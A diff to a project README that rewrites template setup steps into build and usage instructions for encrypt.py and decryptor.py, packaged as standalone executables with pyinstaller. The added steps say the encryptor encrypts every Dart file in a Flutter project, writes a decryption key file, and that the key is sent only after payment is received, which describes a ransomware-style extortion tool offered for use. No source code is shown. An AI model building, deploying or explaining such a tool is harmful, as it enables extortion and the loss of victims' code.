@@ -22,10 +22,9 @@ List the software or environments required to run the project:
     ```
 3.  Install dependencies:
     ```bash
-    # For Node.js projects
-    npm install
+
     # For Python projects
-    pip install -r requirements.txt
+    pip install cryptography
     ```
 
 ## Usage
@@ -35,10 +34,36 @@ List the software or environments required to run the project:
 Provide instructions on how to start the application:
 
 ```bash
-npm start
-# or
-python main.py
+
+python encrypt.py
 ```
+
+### create exe file
+
+```bash
+
+pyinstaller --onefile encrypt.py
+
+```
+
+### create exe file for decryptor.py
+
+```bash
+
+pyinstaller --onefile decryptor.py
+
+```
+
+### how to use
+
+1. run encrypt.py
+2. run decryptor.py
+3. move the exe encrypt file to the flutter project then run encrypt.exe
+4. after run encrypt.exe it will encrypt all the dart files in the flutter project
+5. after encrypting all the dart files it will create a decryption_key.txt file
+6. run #create exe file for decryptor.py
+7. move the exe decryptor file to the flutter project then run decryptor.exe
+8. after that u can send key afte recieve payment
 
 ### Examples
 
